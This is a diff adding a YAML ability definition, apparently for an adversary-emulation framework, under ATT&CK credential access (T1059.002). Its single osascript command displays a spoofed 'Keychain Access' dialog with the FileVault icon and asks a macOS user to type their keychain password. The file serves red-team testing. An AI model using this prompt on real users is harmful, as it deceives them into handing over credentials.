@@ -1,0 +1,23 @@
+---
+
+- id: 26cc6e18-226c-a893-5bd5-84281342f2df
+  name: osascript - Use the osascript binary to prompt the user for credentials
+  description: osascript can be used to generate a dialogue box and request the user to enter the keychain
+    password.
+  tactic: credential-access
+  technique:
+    attack_id: T1059.002
+    name: 'Command and Scripting Interpreter: AppleScript'
+  platforms:
+    darwin:
+      sh:
+        command: osascript -e 'set popup to display dialog "Keychain Access wants to use the login keychain"
+          & return & return & "Please enter the keychain password" & return default answer "" with icon
+          file "System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns" with
+          title "Authentication Needed" with hidden answer'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - osascript
+  - credential-access
